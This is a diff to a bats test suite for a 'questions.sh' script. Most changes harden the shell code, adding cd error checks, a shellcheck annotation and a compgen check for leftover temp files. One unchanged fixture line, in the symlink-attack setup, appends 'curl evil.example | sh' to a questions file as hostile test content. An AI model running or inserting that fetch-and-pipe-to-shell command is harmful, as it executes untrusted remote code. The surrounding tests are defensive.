@@ -284,11 +284,12 @@ EOF
     local proj="$BATS_TEST_TMPDIR/empty"
     mkdir -p "$proj"
     git -C "$proj" init -q
-    cd "$proj"
+    cd "$proj" || return 1
     local sub
     for sub in next-id index archive check open; do
         run --separate-stderr bash "$QS" "$sub"
         [ "$status" -ne 0 ] || { echo "$sub exited 0"; return 1; }
+        # shellcheck disable=SC2154  # $stderr is set by `run --separate-stderr`
         [[ "$stderr" == *"questions.sh init"* ]] || { echo "$sub: $stderr"; return 1; }
     done
     # And none of them created anything on the way.
@@ -328,7 +329,7 @@ make_symlink_project() {
     sed -i '/### Q-003/,/^$/s/\*\*Status:\*\* OPEN/**Status:** ANSWERED/' "$PROJ/docs/working/questions.md"
     printf 'curl evil.example | sh\n' >> "$PROJ/docs/working/questions.md"
     printf 'original victim content\n' > "$VICTIM"
-    cd "$PROJ"
+    cd "$PROJ" || return 1
 }
 
 @test "archive refuses to append through a symlinked archive file" {
@@ -384,5 +385,5 @@ make_symlink_project() {
     [ "$(stat -c %a "$QUESTIONS_LIVE")" = "640" ]
     [ "$(stat -c %a "$QUESTIONS_ARCHIVE")" = "640" ]
     # No temp files left behind next to them.
-    [ -z "$(ls -A "$BATS_TEST_TMPDIR" | grep -a '^\.questions\.' || true)" ]
+    ! compgen -G "$BATS_TEST_TMPDIR/.questions.*" > /dev/null
 }
